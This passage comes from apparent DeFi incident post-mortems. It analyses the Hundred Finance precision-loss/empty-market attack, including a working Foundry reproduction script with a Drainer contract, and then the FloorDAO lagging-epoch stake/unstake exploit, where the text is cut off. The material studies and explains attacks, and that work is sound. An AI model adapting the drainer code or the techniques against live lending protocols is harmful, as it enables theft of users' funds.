to the original attackContract.</p> <p></p> <p>Also, it's noted that due to precision loss, when calculating the amount of hWBTC required to redeem slightly over 500 WBTC, what was supposed to be repayed as 1.999999 hWBTC became 1 in reality.</p> <p></p> <p>Then the attackContract called <code>liquidateBorrow</code> to liquidate the ETHDrain contract, reclaiming the remaining 1 hWBTC with a small amount of Ether.</p> <p></p> <p>Finally, 1 hWBTC was exchanged for 2 WBTC.</p> <p>Clearly, through various operations in the ETHDrain contract, the attacker managed to obtain a substantial amount of Ether from the hETH contract.</p> <p></p> <p>The subsequent flow follows a similar pattern, involving different tokens. Eventually, the attacker drained tokens from various lending pools in the Hundred Finance protocol.</p>"},{"location":"2023/230415_HundredFinance/#vulnerability","title":"Vulnerability","text":"<p>To understand the vulnerability and the profit-making mechanism of the attack, it is necessary to first have an understanding of the Hundred Finance protocol, specifically the original protocol Compound v2. Due to the amount of publicly available information, a detailed introduction will not be provided here. You can refer to the official documentation, whitepaper, and source code for learning.</p>"},{"location":"2023/230415_HundredFinance/#precision-loss-rounding-error","title":"Precision Loss / Rounding Error","text":"<p>It is obvious from the analysis of the attack transaction that there is a problem of precision loss in the protocol's operations. In fact, this was first pointed out in the audit by OpenZeppelin, which suggested that this might cause (very small) losses to users, where users would receive slightly less tokens than the calculated result during related operations. This is the case of precision loss that occurs in the <code>redeem</code> of the ETHDrain contract after <code>mint</code>.</p> <p>However, through the attack transaction, we can see that this precision loss can also enable users to profit, i.e., in the case of paying the same amount of cTokens, they can get more Underlying Tokens. This is the case of precision loss that occurs in the <code>redeemUnderlying</code> call of the ETHDrain contract.</p> <p>Below is the calculation of the additional amount of Underlying Tokens that can be obtained through this precision loss.</p> <p>For a certain lending pool, assuming there is currently:</p> \\[ \\begin{align} C =  underlyingBalance + totalBorrowBalance - reserves \\tag{1} \\\\   T = cTokenSupply \\tag{2} \\\\ exchangeRate = \\frac{C}{T} \\tag{3}  \\end{align} \\] <p>And the user owns a cToken amount of \\(kT (0 \\leq k \\leq 1)\\). Then, the accurate amount of Underlying Tokens that can be exchanged for is: $$ \\begin{align} amountAccurate = kT \\times exchangeRate = kC \\tag{4} \\end{align} $$</p> <p>While if utilizing the precision loss, the maximum amount of Underlying Tokens that can be obtained is approximately: $$amountMax \\approx (kT+1) \\times exchangeRate = kC + \\frac{C}{T} \\tag{5} $$</p> <p>Meaning the additional amount of Underlying Tokens that can be obtained is \\(exchangeRate = \\frac{C}{T}\\).</p> <p>Taking an example from a normal <code>redeemUnderlying</code> transaction in Compound v2 on the Ethereum mainnet. In the original transaction, 37.33289964 cETH was redeemed for 0.75 Ether.</p> <pre><code>function testRedeemPrecisionLoss() external {\n    // https://etherscan.io/tx/0x5a1b6484ed92777fa6f7a7d63c0ba032b81443835e2c3e89520899a2a0f3f6c5\n    // 37.33289964 cETH -&gt; 0.75 Ether\n    address sender = 0x8e445422BaA49C7b98645E918577DE7D48280384;\n    ICEther cETH = ICEther(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);\n    vm.startPrank(sender);\n    vm.createSelectFork(\"eth\", 18328594);\n    vm.roll(18328595);\n    cETH.accrueInterest();\n\n    uint256 exchangeRate = cETH.exchangeRateStored();\n    emit log_named_uint(\"cETH exchangeRate\", exchangeRate);\n\n    uint256 cETHAmountIn = 3733289964;\n    uint256 redeemAmountAccurate = cETHAmountIn * exchangeRate / 1e18;\n    uint256 precisionLossProfit = (cETHAmountIn + 1) * exchangeRate / 1e18;\n    console.log(\"redeemAmountAccurate:\", redeemAmountAccurate);\n    console.log(\"precisionLossProfit:\", precisionLossProfit);\n    cETH.redeemUnderlying(precisionLossProfit);\n    // 37.33289964 cETH -&gt; 0.750000000126279633 Ether\n    vm.stopPrank();\n}\n</code></pre> <p>Through the above calculation, it can be found that, according to the exchange rate at that time, 3733289964 cETH should only be exchanged for 0.749999999925384442 ETH, but due to precision loss, it can actually be exchanged for up to 0.750000000126279633 ETH.</p>"},{"location":"2023/230415_HundredFinance/#empty-market","title":"Empty Market","text":"<p>From the above analysis, it can be seen that although precision loss can expand the amount of Underlying Tokens that can be redeemed by a certain amount of fixed cTokens, under normal circumstances, due to the small <code>exchangeRate</code>, the additional amount that can be obtained is limited even for high-value WBTC with only 8 decimals.</p> <p>Therefore, according to the calculation method of <code>exchangeRate</code>, directly transferring Underlying Tokens into cToken is an obvious means to expand the rate and thereby increase the profit from precision loss. (Note that, without considering <code>accrueInterest</code>, regular <code>mint</code> or <code>redeem</code> will not change the rate.)</p> <p>Suppose the amount of Underlying Tokens transferred by the attacker to the cToken contract is \\(I\\), then at this point:</p> \\[exchangeRate1 = \\frac{C+I}{T} \\tag{6}\\] <p>The amount of Underlying Tokens that can be redeemed using precision loss is:</p> \\[ amountOut =  (kT+1) \\times exchangeRate1 = k(C+I) + \\frac{(C+I)}{T} \\tag{7}\\] <p>And before the transfer, the original amount of Underlying Tokens is:</p> \\[ amountIn = I + amountMax = I + kC + \\frac{C}{T} \\tag{8}\\] <p>To make a profit, it must satisfy:</p> \\[ amountOut &gt; amountIn \\tag{9} \\] <p>Combining \\((7),(8), (9)\\), we can conclude that profit requires:</p> \\[I \\times (k + \\frac{1}{T} - 1) &gt; 0 \\tag{10}\\] <p>So, along with \\(I&gt;0\\), it must satisfy:</p> \\[k + \\frac{1}{T} - 1 &gt; 0 \\tag{11}\\] <p>Obviously, when \\(k=1\\), this condition is met. And when \\(k\\neq 1\\), the larger \\(T\\) is, the larger \\(k\\) needs to be.</p> <p>In other words, when the attacker owns all the cTokens, they can meet the attack conditions. Otherwise, it depends on the current <code>cTokenSupply</code>, the more the totalSupply, the more share the attacker is required to occupy.</p> <p>Therefore, it is obvious that when empty markets exist, this method of transferring a large amount of Underlying Tokens can be used to manipulate the <code>exchangeRate</code> and profit from precision loss.</p> <p>Specifically, when an empty market is found, the attacker can <code>mint</code> cTokens, making \\(k=1\\), and the additional profit the attacker can obtain using precision loss is:</p> \\[profit = amountOut - amountIn = \\frac{I}{T} \\tag{12}\\] <p>So, to gain more profit, the amount of funds \\(I\\) transferred in should be larger, and the quantity of cTokens obtained after <code>mint</code>, i.e., \\(T\\), should be smaller.</p> <p>Now let's analyze the hWBTC contract attacked.</p> <pre><code>function testEmpty() external {\n    vm.createSelectFork(\"optimism\", 89017326);\n    uint256 totalSupply = hWBTC.totalSupply();\n    console.log(\"empty market?\", totalSupply == 0);\n}\n</code></pre> <p>Querying the contract state before the attacker's action reveals that the <code>cTotalSupply</code> of this hWBTC contract is 0, indicating that the state complies with empty markets, thus enabling the attacker to launch the attack using precision loss.</p>"},{"location":"2023/230415_HundredFinance/#exploit","title":"Exploit","text":""},{"location":"2023/230415_HundredFinance/#reproduce","title":"Reproduce","text":"<p>Based on the previous analysis, combined with the attack transaction, the following script can be used for attack. Here, we only focus on attacking hETH as an example.</p> <pre><code>function testExploit() external {\n    uint256 blockNumber = 89017326; // before the attacker's first mint\n    vm.createSelectFork(\"optimism\", blockNumber);\n    deal(address(WBTC), address(this), 800*1e8);\n    deal(address(this), 0);  // https://twitter.com/TheBlockChainer/status/1727309850810392771\n    console.log(\"before attack\");\n    emit log_named_decimal_uint(\"ETH balance\", address(this).balance, 18);\n    emit log_named_decimal_uint(\"WBTC balance\", WBTC.balanceOf(address(this)), WBTC.decimals());\n\n    uint256 _salt = uint256(keccak256(abi.encodePacked(uint256(0))));\n    bytes memory bytecode = type(Drainer).creationCode;\n    bytes memory contractBytecode = abi.encodePacked(bytecode, abi.encode(address(hEther)));\n    address DrainAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(contractBytecode))))));\n\n    WBTC.transfer(DrainAddress, WBTC.balanceOf(address(this)));\n    Drainer drainer = new Drainer{salt: bytes32(_salt)}(hEther);  // drain the hETH pool\n\n    uint256 exchangeRate = hWBTC.exchangeRateStored();\n    uint256 liquidationIncentiveMantissa = 1080000000000000000;\n    uint256 priceBorrowedMantissa = priceOracle.getUnderlyingPrice(address(hEther));\n    uint256 priceCollateralMantissa = priceOracle.getUnderlyingPrice(address(hWBTC));\n    uint256 hTokenAmount = 1;\n    uint256 liquidateAmount = 1e18/(priceBorrowedMantissa * liquidationIncentiveMantissa / (exchangeRate * hTokenAmount * priceCollateralMantissa / 1e18)) + 1;\n    hEther.liquidateBorrow{value: liquidateAmount}(address(drainer), address(hWBTC)); // liquidate to get the 1 hWBTC\n    hWBTC.redeem(1); // redeem to recover the empty market\n\n    console.log(\"after attack\");\n    emit log_named_decimal_uint(\"ETH balance\", address(this).balance, 18);\n    emit log_named_decimal_uint(\"WBTC balance\", WBTC.balanceOf(address(this)), WBTC.decimals());\n}\n\ncontract Drainer is Test {\n    ICErc20 WBTC = ICErc20(0x68f180fcCe6836688e9084f035309E29Bf0A2095);\n    ICErc20 hWBTC = ICErc20(0x35594E4992DFefcB0C20EC487d7af22a30bDec60);\n    IComptroller comptroller = IComptroller(0x5a5755E1916F547D04eF43176d4cbe0de4503d5d);\n    ICEther hEther;\n\n    constructor(ICEther token) payable {\n        hEther = token;\n        WBTC.approve(address(hWBTC), type(uint256).max);\n        hWBTC.mint(1 * 1e8);\n        // hWBTC.redeem(hWBTC.totalSupply() - 1);\n        hWBTC.redeem(hWBTC.totalSupply() - 2);  // get 2 hWBTC, the totalSupply is 2\n\n        uint256 donationAmount = WBTC.balanceOf(address(this));\n        WBTC.transfer(address(hWBTC), donationAmount);\n        console.log(\"donationAmount:\", donationAmount);\n\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(hWBTC);\n        comptroller.enterMarkets(cTokens);\n\n        uint256 cWBTCAmountIn = 1;\n        uint256 exchangeRate = hWBTC.exchangeRateStored();\n        uint256 precisionLossMaxAmount = (cWBTCAmountIn + 1) * exchangeRate / 1e18;\n        console.log(\"precisionLossMaxAmount:\", precisionLossMaxAmount);\n\n        uint256 borrowAmount = hEther.getCash();\n        hEther.borrow(borrowAmount); // using cWBTC as collateral to lend ETH\n        payable(address(msg.sender)).transfer(address(this).balance);\n\n        uint256 redeemAmount;\n        if (precisionLossMaxAmount &gt; donationAmount) {\n            redeemAmount = donationAmount;\n        } else {\n            redeemAmount = precisionLossMaxAmount;\n        }\n        console.log(\"redeemAmount:\", redeemAmount);\n        hWBTC.redeemUnderlying(redeemAmount);  // due to precision loss, only 1hWBTC was used to redeem all WBTCs\n\n        WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));\n    }\n}\n</code></pre> <p>It should be noted that since hWBTC is an empty market and does not hold much WBTC itself, utilizing precision loss alone cannot directly profit from the hWBTC contract. Therefore, a different approach is needed. The attacker can first <code>mint</code> a small amount of hWBTC, then transfer a large amount of WBTC to the hWBTC contract. At this point, the exchangeRate is extremely high, so the hWBTC can be used as collateral to borrow tokens from other pools, thus emptying them. Later, due to precision loss, the attacker can use <code>redeem</code> to withdraw the previously transferred WBTC without using all the hWBTC, while bypassing the liquidity check on the account during <code>redeem</code>. Namely, the portion of precision loss is used as collateral to borrow tokens from other pools, thus profiting.</p> <p>Specifically, according to the previous analysis, to maximize the profit from precision loss, the smaller the amount of hWBTC obtained after <code>mint</code>, i.e., the smaller the totalSupply of hWBTC, the better. One can <code>mint</code> first and then <code>redeem</code> to retain a small amount of hWBTC. In reality, the attacker obtained 2 hWBTC, not the minimum 1 hWBTC. Observing the code of newer versions of the Compound v2, it can be found that the <code>redeem</code> function will call the following <code>redeemVerify</code> function at the end, which can prevent the attacker from passing in 0 hWBTC when using precision loss. However, in the version of the contract used by Hundred Finance, no such verification exists. Thus, in reality, it is possible to <code>mint</code> only the minimum 1 hWBTC for the attack, achieving greater profit (although there are not so many funds in other pools).</p> <pre><code>function redeemVerify(address cToken, address redeemer, uint redeemAmount, uint redeemTokens) external {\n    // Shh - currently unused\n    cToken;\n    redeemer;\n\n    // Require tokens is zero or amount is also zero\n    if (redeemTokens == 0 &amp;&amp; redeemAmount &gt; 0) {\n        revert(\"redeemTokens zero\");\n    }\n}\n</code></pre> <p>After obtaining a small amount of hWBTC, a large amount of WBTC is transferred to the hWBTC contract to raise the exchangeRate, and then all ETH is borrowed from the hEther contract. Finally, using precision loss, all previously transferred WBTC can be redeemed, while bypassing the liquidity checks. (That is, the <code>Comptroller</code> contract's <code>getHypotheticalAccountLiquidityInternal</code> function only considers the attacker <code>redeem</code> out 1 hWBTC worth of WBTC, but in reality, it is close to 2 hWBTC worth of WBTC.)</p> <p>Finally, the Drainer contract created is liquidated by <code>liquidateBorrow</code>, and then <code>redeem</code>, causing the hWBTC contract to become an empty market again, thus continuing to attack other token markets using hWBTC. The specific amount of ETH needed to liquidate 1 hWBTC can be deduced by the <code>liquidateCalculateSeizeTokens</code> function of the <code>Comptroller</code> contract, and also due to precision loss, the final amount needs to be increased by 1.</p>"},{"location":"2023/230415_HundredFinance/#attack-flow","title":"Attack Flow","text":"<p>Below is an analysis of the entire attack process of the attacker.</p> <p></p> <p>The attacker first transfers funds from the L1 mainnet to Optimism, totaling 4.1 ETH and 0.31 WBTC.</p> <p></p> <p>Then, using 0.3 WBTC, mints about 0.15 hWBTC.</p> <p></p> <p>The following 8 transactions are attacks on two sets of Hundred Finance protocols (not studied, maybe one old and one new?). After creating the attack contract, the attacker first transfers the previously obtained hWBTC to two contracts (one of which is actually useless). Then two calls are made, the first to launch the attack and the second to withdraw the profit.</p> <p></p> <p>Then, Multichain and Fraxferry are used to send USDC, USDT, DAI, WBTC, ETH, and FRAX back to the Ethereum mainnet.</p> <p></p> <p>On the mainnet address, funds were first obtained from Tornado Cash on April 11.</p> <p></p> <p>After the attack was completed, the attacker exchanged USDT and USDC, which are subject to blacklist mechanisms, for other tokens through exchanges or by adding liquidity.</p> <p>As of the writing of this article, the attacker has not taken any further action, and all profits are still in the original address.</p>"},{"location":"2023/230415_HundredFinance/#misc","title":"Misc","text":""},{"location":"2023/230415_HundredFinance/#frontrunning-protection","title":"Frontrunning Protection","text":"<p>According to the previous analysis, the attacker first <code>mint</code> a small amount of hWBTC before the AttackTx and then <code>redeem</code> it back to WBTC in the AttackTx, using it along with the 500 WBTC borrowed for the attack.</p> <p>This way, the attacker already occupied all the shares of the WBTC market before the actual attack, and the <code>redeem</code> calls involved, as well as the actual use of more WBTC than borrowed, can prevent frontrunning.</p>"},{"location":"2023/230415_HundredFinance/#patch","title":"Patch","text":"<pre><code>function testPatch() external {\n    uint256 blockNumber = 90843467;\n    vm.createSelectFork(\"optimism\", blockNumber);\n    console.log(\"Mint Pause:\", comptroller.mintGuardianPaused(address(hWBTC)));\n}\n</code></pre> <p>Approximately 4 hours after the attack occurred, the project team initiated a transaction to execute an emergency pause, which prohibited the minting of tokens related to the protocol, preventing further exploitation of the vulnerability.</p>"},{"location":"2023/230905_FloorDAO/","title":"230905-FloorDAO","text":""},{"location":"2023/230905_FloorDAO/#attacktx","title":"AttackTx","text":"<p>Analyzing the attack transaction using Phalcon.</p>"},{"location":"2023/230905_FloorDAO/#fund-flow","title":"Fund Flow","text":"<p>The fund flow is not complex.</p> <p></p> <p>The attacking contract withdrew approximately 150k Floor tokens from the Uniswap pool and later returned around 168k tokens. Additionally, it obtained 40 WETH. It appears that the attacker used the flash loan functionality of the pool to acquire the initial capital for the attack and then converted the profit earned in Floor tokens into WETH.</p> <p></p> <p>Subsequently, the attacking contract transferred Floor tokens to the FloorStaking contract (2), while new Floor tokens were minted into the staking contract (3). This process involved minting and burning gFloor tokens (4, 5). In the end, the attacking contract obtained more Floor tokens than initially transferred to the staking contract (6). (There appears to be an issue in the flow here, as the amount transferred to the staking contract exceeded the originally borrowed Floor tokens.)</p> <p>Clearly, the attacker was able to profit from this attack, and the issue seems to be related to the FloorStaking contract.</p>"},{"location":"2023/230905_FloorDAO/#balance-changes","title":"Balance Changes","text":"<p>From the balance changes, it is evident that the attacker profited by approximately 16k Floor tokens, which were then exchanged for 40 WETH. These Floor tokens originated from the FloorStaking contract, and approximately 13k new Floor tokens were minted by the contract during the attack.</p>"},{"location":"2023/230905_FloorDAO/#state-changes","title":"State Changes","text":"<p>It can be observed that the <code>Epoch</code>'s <code>number</code> and <code>end</code> in the problematic FloorStaking contract were altered.</p> <p></p> <p>The total supply of Floor tokens increased, and new tokens were minted.</p> <p></p> <p>The state of sFloor tokens also changed significantly.</p>"},{"location":"2023/230905_FloorDAO/#invocation-flow","title":"Invocation Flow","text":"<p>Next, let's analyze the details of the internal calls within the transaction.</p> <p></p> <p>The transaction starts by directly calling the <code>flash</code> function of the Uniswap pool, executing a flash loan of all Floor tokens from the pool.</p> <p></p> <p>The core of the callback appears to be a loop:</p> <p><code>circulatingSupply -&gt; approve -&gt; stake -&gt; unstake</code></p> <p></p> <p>Finally, the attacker repays the loan and converts excess Floor tokens into WETH.</p> <p>Clearly, the main issue lies within the loop of continuous <code>stake</code> and <code>unstake</code> operations, through which the attacker gained more Floor tokens.</p> <p>By combining the static call, let's carefully analyze the logic within this loop.</p> <p></p> <p>The <code>circulatingSupply</code> function retrieves the circulating supply of sFloor tokens. The <code>approve</code> function approves the Floor token balance owned by the attacker for the staking contract. Each time, the <code>circulatingSupply</code> value increases.</p> <p>The key to profit lies in the <code>stake</code> and <code>unstake</code> functions. The <code>stake</code> function allows the attacker to deposit all Floor tokens and then immediately call <code>unstake</code>, resulting in more Floor tokens than initially staked. This process is repeated, enabling the attacker to acquire more Floor tokens.</p> <p>Hence, in the earlier fund flow, the transfers of Floor tokens (2, 6) should represent the cumulative effect of multiple cycles of <code>stake</code> and <code>unstake</code> transfers.</p> <p>Now, let's analyze the internal call logic of the <code>stake</code> and <code>unstake</code> functions separately.</p> <p></p> <p>In the <code>stake</code> function, the attacker first transfers Floor tokens to the staking contract, then calls the <code>rebase</code> function of sFloor, followed by the <code>distribute</code> function of the Distributor contract. Finally, it mints gFloor tokens for the attacker.</p> <p>The sequence involves depositing tokens into the contract, performing a <code>rebase</code>, distributing tokens, and obtaining staking certificates in the form of gFloor tokens.</p> <p></p> <p>All internal calls within <code>rebase</code> are static calls.</p> <p></p> <p>The <code>distribute</code> function, on the other hand, mints new Floor tokens for the FloorStaking contract via the Treasury contract.</p> <p></p> <p>In the <code>unstake</code> function, the attacker calls the <code>rebase</code> function first (compared to <code>stake</code>, there is profit here, and the epoch is increased by 1). Then, it calls the <code>distribute</code> function of the Distributor contract again. Finally, the attacker burns the gFloor tokens owned and receives more Floor tokens than when initially staked.</p> <p>Clearly, there are some subtle issues within the <code>stake</code> and <code>unstake</code> functions of the FloorStaking contract that allowed the attacker to profit.</p>"},{"location":"2023/230905_FloorDAO/#vulnerability","title":"Vulnerability","text":"<p>The vulnerability in the FloorDAO protocol and the reasons behind the attacker's profit are complex. Below is a brief analysis. For a detailed understanding, you would need to refer to the relevant contract code of FloorStaking, as well as knowledge about the FloorDAO protocol and rebase tokens.</p>"},{"location":"2023/230905_FloorDAO/#floordao","title":"FloorDAO","text":"<p>Floor token is a rebase token, and users can earn profits by staking Floor tokens in the staking contract.</p> <pre><code>/**\n* @notice stake FLOOR to enter warmup\n* @param _to address\n* @param _amount uint\n* @param _claim bool\n* @param _rebasing bool\n* @return uint\n*/\nfunction stake(\n    address _to,\n    uint256 _amount,\n    bool _rebasing,\n    bool _claim\n) external returns (uint256) {\n    FLOOR.safeTransferFrom(msg.sender, address(this), _amount);\n    _amount = _amount.add(rebase()); // add bounty if rebase occurred\n    if (_claim &amp;&amp; warmupPeriod == 0) {\n        return _send(_to, _amount, _rebasing);\n    } else {\n        Claim memory info = warmupInfo[_to];\n        if (!info.lock) {\n            require(_to == msg.sender, \"External deposits for account are locked\");\n        }\n\n        warmupInfo[_to] = Claim({\n            deposit: info.deposit.add(_amount),\n            gons: info.gons.add(sFLOOR.gonsForBalance(_amount)),\n            expiry: epoch.number.add(warmupPeriod),\n            lock: info.lock\n        });\n\n        gonsInWarmup = gonsInWarmup.add(sFLOOR.gonsForBalance(_amount));\n\n        return _amount;\n    }\n}\n/**\n* @notice send staker their amount as sFLOOR or gFLOOR\n* @param _to address\n* @param _amount uint\n* @param _rebasing bool\n*/\nfunction _send(\n    address _to,\n    uint256 _amount,\n    bool _rebasing\n) internal returns (uint256) {\n    if (_rebasing) {\n        sFLOOR.safeTransfer(_to, _amount); // send as sFLOOR (equal unit as FLOOR)\n        return _amount;\n    } else {\n        gFLOOR.mint(_to, gFLOOR.balanceTo(_amount)); // send as gFLOOR (convert units from FLOOR)\n        return gFLOOR.balanceTo(_amount);\n    }\n}\n</code></pre> <p>The <code>stake</code> function is responsible for the staking feature, where users stake Floor tokens and receive sFloor/gFloor tokens in return. Both sFloor and gFloor tokens serve the same purpose in earning rewards, with gFloor having additional governance functionality.</p> <p>Depending on the <code>_claim</code> parameter, it decides whether to execute warmup-related operations. If it's true and the <code>warmupPeriod</code> is 0 (as set in the contract), users need to call the <code>claim</code> function to <code>_send</code> and receive tokens. (The warmup is a waiting period before a staker can take their sToken with the rebase rewards. Warmup does not affect the reward amount, it only adds a time threshold for claiming the rewards.)</p> <pre><code>/**\n* @notice convert _amount sFLOOR into gBalance_ gFLOOR\n* @param _to address\n* @param _amount uint\n* @return gBalance_ uint\n*/\nfunction wrap(address _to, uint256 _amount) external returns (uint256 gBalance_) {\n    sFLOOR.safeTransferFrom(msg.sender, address(this), _amount);\n    gBalance_ = gFLOOR.balanceTo(_amount);\n    gFLOOR.mint(_to, gBalance_);\n}\n\n/**\n* @notice convert _amount gFLOOR into sBalance_ sFLOOR\n* @param _to address\n* @param _amount uint\n* @return sBalance_ uint\n*/\nfunction unwrap(address _to, uint256 _amount) external returns (uint256 sBalance_) {\n    gFLOOR.burn(msg.sender, _amount);\n    sBalance_ = gFLOOR.balanceFrom(_amount);\n    sFLOOR.safeTransfer(_to, sBalance_);\n}\n</code></pre> <p>After staking, users can convert their sFloor/gFloor tokens using the <code>wrap</code> and <code>unwrap</code> functions in the contract.</p> <pre><code>constructor() ERC20(\"Staked FLOOR\", \"sFLOOR\", 9) ERC20Permit(\"Staked FLOOR\") {\n    initializer = msg.sender;\n    _totalSupply = INITIAL_FRAGMENTS_SUPPLY;\n    _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\n}\n\nfunction initialize(address _stakingContract, address _treasury) external {\n    require(msg.sender == initializer, \"Initializer:  caller is not initializer\");\n\n    require(_stakingContract != address(0), \"Staking\");\n    stakingContract = _stakingContract;\n    _gonBalances[stakingContract] = TOTAL_GONS;\n\n    require(_treasury != address(0), \"Zero address: Treasury\");\n    treasury = _treasury;\n\n    emit Transfer(address(0x0), stakingContract, _totalSupply);\n    emit LogStakingContractUpdated(stakingContract);\n\n    initializer = address(0);\n}\n</code></pre> <p>Considering gas costs, adjusting the balances of stakers proportionally with each rebase would be overly complex. Therefore, the contract introduces variables like <code>_gonsPerFragment</code> and <code>TOTAL_GONS</code> in the sFloor token contract. The initial supply of sFloor tokens is set as <code>INITIAL_FRAGMENTS_SUPPLY</code>, and <code>_gonsPerFragment</code> is calculated as <code>TOTAL_GONS/_totalSupply</code>.</p> <p>Here, gons serve as an internal unit, with a fixed total supply of <code>TOTAL_GONS</code>, while <code>_gonsPerFragment</code> changes with <code>_totalSupply</code>.</p> <pre><code>function transfer(address to, uint256 value) public override(IERC20, ERC20) returns (bool) {\n    uint256 gonValue = value.mul(_gonsPerFragment);\n\n    _gonBalances[msg.sender] = _gonBalances[msg.sender].sub(gonValue);\n    _gonBalances[to] = _gonBalances[to].add(gonValue);\n\n    require(balanceOf(msg.sender) &gt;= debtBalances[msg.sender], \"Debt: cannot transfer amount\");\n    emit Transfer(msg.sender, to, value);\n    return true;\n}\nfunction balanceOf(address who) public view override(IERC20, ERC20) returns (uint256) {\n    return _gonBalances[who].div(_gonsPerFragment);\n}\n</code></pre> <p>When users stake, they receive a balance represented by <code>_gonBalances</code>. This value is calculated based on the <code>gonsPerFragment</code> at the time of staking and doesn't change afterward. sFloor token balances are calculated as <code>_gonBalances/_gonsPerFragment</code>.</p> <pre><code>/**\n@notice increases sFLOOR supply to increase staking balances relative to profit_\n@param profit_ uint256\n@return uint256\n*/\nfunction rebase(uint256 profit_, uint256 epoch_) public override onlyStakingContract returns (uint256) {\n    uint256 rebaseAmount;\n    uint256 circulatingSupply_ = circulatingSupply();\n    if (profit_ == 0) {\n        emit LogSupply(epoch_, _totalSupply);\n        emit LogRebase(epoch_, 0, index());\n        return _totalSupply;\n    } else if (circulatingSupply_ &gt; 0) {\n        rebaseAmount = profit_.mul(_totalSupply).div(circulatingSupply_);\n    } else {\n        rebaseAmount = profit_;\n    }\n\n    _totalSupply = _totalSupply.add(rebaseAmount);\n\n    if (_totalSupply &gt; MAX_SUPPLY) {\n        _totalSupply = MAX_SUPPLY;\n    }\n\n    _gonsPerFragment = TOTAL_GONS.div(_totalSupply);\n\n    _storeRebase(circulatingSupply_, profit_, epoch_);\n\n    return _totalSupply;\n}\n</code></pre> <p>Therefore, when conducting a <code>rebase</code> to mint new tokens, after increasing <code>_totalSupply</code>, only <code>_gonsPerFragment</code> needs to be adjusted correspondingly to increase the sFloor token balance of stakers. The gons balance of sFloor token holders never changes; it's only altered by changing <code>_gonsPerFragment</code>.</p> <pre><code>struct Epoch {\n    uint256 length; // in seconds\n    uint256 number; // since inception\n    uint256 end; // timestamp\n    uint256 distribute; // amount\n}\n</code></pre> <p>The staking contract uses the <code>Epoch</code> structure to keep track of rebase states. An epoch is a waiting period before a staker can claim rebase rewards. The <code>length</code> of an epoch in the Floor protocol is 8 hours, meaning that a rebase can occur every 8 hours. The <code>distribute</code> field represents the amount of rewards to be distributed in that epoch, which corresponds to the <code>rebaseAmount</code>.</p> <pre><code>/**\n* @notice trigger rebase if epoch over\n* @return uint256\n*/\nfunction rebase() public returns (uint256) {\n    uint256 bounty;\n    if (epoch.end &lt;= block.timestamp) {\n        sFLOOR.rebase(epoch.distribute, epoch.number);\n\n        epoch.end = epoch.end.add(epoch.length);\n        epoch.number++;\n\n        if (address(distributor) != address(0)) {\n            distributor.distribute();\n            bounty = distributor.retrieveBounty(); // Will mint floor for this contract if there exists a bounty\n        }\n        uint256 balance = FLOOR.balanceOf(address(this));\n        uint256 staked = sFLOOR.circulatingSupply();\n        if (balance &lt;= staked.add(bounty)) {\n            epoch.distribute = 0;\n        } else {\n            epoch.distribute = balance.sub(staked).sub(bounty);\n        }\n    }\n    return bounty;\n}\n</code></pre> <p>Each epoch's rebase amount is calculated in the <code>rebase</code> function of the staking contract. This function checks if it's time for a rebase, then calls the rebase function of the sFloor token to mint new Floor tokens for the current epoch and adjusts to the next epoch.</p> <pre><code>/**\n@notice send epoch reward to staking contract\n*/\nfunction distribute() external override {\n    require(msg.sender == staking, \"Only staking\");\n    // distribute rewards to each recipient\n    for (uint256 i = 0; i &lt; info.length; i++) {\n        if (info[i].rate &gt; 0) {\n            treasury.mint(info[i].recipient, nextRewardAt(info[i].rate)); // mint and send tokens\n            adjust(i); // check for adjustment\n        }\n    }\n}\n/**\n@notice view function for next reward at given rate\n@param _rate uint\n@return uint\n*/\nfunction nextRewardAt(uint256 _rate) public view override returns (uint256) {\n    return floor.totalSupply().mul(_rate).div(rateDenominator);\n}\n</code></pre> <p>The <code>distribute</code> function of the distributor contract is called to mint new Floor tokens for the staking contract. In this case, there's only one entry in <code>info</code>, which corresponds to the staking contract. The rate is set as 250/1000000, meaning that the Floor token's total supply will inflate by 0.025% every epoch.</p> <p>In conclusion, during a rebase, the <code>rebase</code> function calculates how much rewards to distribute for the current epoch. If the Floor token balance in the staking contract is greater than the circulating supply of sFloor tokens, the surplus becomes the <code>distribute</code> amount for the next epoch.</p>"},{"location":"2023/230905_FloorDAO/#reason-for-profit","title":"Reason for Profit","text":"<p>The previous section briefly explained the process of the Floor protocol staking, which seems reasonable on the surface but actually contains some issues. Specifically, the attacker's profit in this attack can be attributed to the combination of the following two reasons.</p>"},{"location":"2023/230905_FloorDAO/#lagging-epoch","title":"Lagging Epoch","text":"<p>As mentioned earlier, the Floor staking protocol has an epoch that occurs every 8 hours, during which token distribution takes place. Users receive more Floor tokens based on their staking ratio. In normal circumstances, users would need to wait for at least one epoch (0-8 hours) after staking to let the <code>rebase</code> process complete before they can claim their rewards by <code>unstaking</code>.</p> <p>However, if the <code>rebase</code> process is not executed in a timely manner (according to the code, either by directly calling the <code>rebase</code> function, invoking the <code>stake</code> function, or calling the <code>unstake</code> function with the <code>_trigger</code> parameter), which means that staking activities are infrequent and there are no bots to perform timely rebases, it results in a lagging epoch.</p> <p>A lagging epoch allows users to perform an immediate <code>rebase</code> and then <code>unstake</code>, acquiring more newly minted Floor tokens. In this attack, which occurred on September 5th, the staking epoch was still at May 16th, lagging behind by several months. Therefore, the attacker was able to flash loan Floor tokens in a single transaction, execute multiple <code>rebase</code> operations, and profit from the token distributed without any monetary or time cost.</p> <p>In theory, a lag of at least two epochs is required. The first epoch is used for staking and accumulating <code>profit</code> (as <code>stake</code> triggers one <code>rebase</code> call, but the attacker do not complete the staking before it), while the second epoch is used for <code>unstaking</code> to claim rewards (obtaining the distributed rewards set during the previous <code>rebase</code>).</p> <p>(However, flash loans come with fees, so it is not so easy to profit from this process.)</p>"},{"location":"2023/230905_FloorDAO/#bug-in-stake-function","title":"Bug in <code>stake</code> Function","text":"<p>The second issue lies within a bug in the <code>stake</code> function.</p> <p>Based on the previous analysis, as <code>rebase</code> increases, the number of sFloor tokens owned by users (<code>sFloor.balanceOf()</code>) increases. Through the <code>unstake</code> process, sFloor tokens can be exchanged for Floor tokens, allowing users to earn rewards. Clearly, during this process, Floor tokens also need to be minted, and the minted amount should be equivalent to the increase in sFloor tokens.</p> <p>From the earlier analysis, we understand that during each <code>rebase</code>, the <code>distributor</code> calls the <code>distribute</code> function to <code>mint</code> new Floor tokens. These newly minted tokens should constitute the rewards to be distributed 